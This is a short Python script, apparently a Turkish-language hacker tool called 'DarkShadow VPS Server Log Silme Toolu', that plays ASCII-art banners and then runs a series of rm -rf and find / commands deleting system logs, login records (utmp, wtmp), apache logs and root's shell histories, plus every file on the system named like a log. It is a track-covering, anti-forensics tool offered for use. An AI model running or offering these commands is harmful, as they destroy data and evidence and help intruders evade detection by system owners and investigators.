import time
import random,time, sys,os
from colorama import *
init(autoreset=True)
fr = Fore.RED
fb = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN

def logo():
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  
    ''')
    time.sleep(0.08)
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  
    ''')
    time.sleep(0.08)
    print(f'''
     / **/|        
     | == /        
      |  |                  
    ''')
    time.sleep(0.08)
    print(f"""
     _.-^^---....,,--      
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
logo()
time.sleep(0.2)
def logo1():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """    

 ______   _______  _______  _        _______           _______  ______   _______          
(  __  \ (  ___  )(  ____ )| \    /\(  ____ \|\     /|(  ___  )(  __  \ (  ___  )|\     /|
| (  \  )| (   ) || (    )||  \  / /| (    \/| )   ( || (   ) || (  \  )| (   ) || )   ( |
| |   ) || (___) || (____)||  (_/ / | (_____ | (___) || (___) || |   ) || |   | || | _ | |
| |   | ||  ___  ||     __)|   _ (  (_____  )|  ___  ||  ___  || |   | || |   | || |( )| |
| |   ) || (   ) || (\ (   |  ( \ \       ) || (   ) || (   ) || |   ) || |   | || || || |
| (__/  )| )   ( || ) \ \__|  /  \ \/\____) || )   ( || )   ( || (__/  )| (___) || () () |
(______/ |/     \||/   \__/|_/    \/\_______)|/     \||/     \|(______/ (_______)(_______)

		                  """
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write(" \x1b[1;%dm%s%s\n " % (random.choice(colors), line, clear))
        time.sleep(0.04)
logo1()

print("DarkShadow VPS Server Log Silme Toolu..")

def typewriter(text, delay=0.1):
  for letter in text:
    print(letter, end='', flush=True)
    time.sleep(delay)
  print()
    
typewriter("******************************************************************", 0.09)
time.sleep(2)
print("Loglar Silinmeye Başladı Lütfen Sabırla Bekleyin...")
os.system("rm -rf /tmp/logs ")
os.system("rm -rf $HISTFILE ")
os.system("rm -rf /root/.ksh_history")
os.system("rm -rf /root/.bash_logout")
os.system("rm -rf /usr/local/apache/logs")
os.system("rm -rf /usr/local/apache/log")
os.system("rm -rf /var/apache/logs")
os.system("rm -rf /var/apache/log")
os.system("rm -rf /var/run/utmp")
os.system("rm -rf /var/logs")
os.system("rm -rf /var/log")
os.system("rm -rf /var/adm")
os.system("rm -rf /etc/wtmp")
os.system("find / -name *.bash_history -exec rm -rf {} ;")
os.system("find / -name *.bash_logout -exec rm -rf {} ;")
os.system("find / -name “log*” -exec rm -rf {} ;")
os.system("find / -name *.log -exec rm -rf {} ;")
os.system("rm -rf /root/.bash_history")
os.system("history -c")
print("Bütün Loglar Temizlendi...")
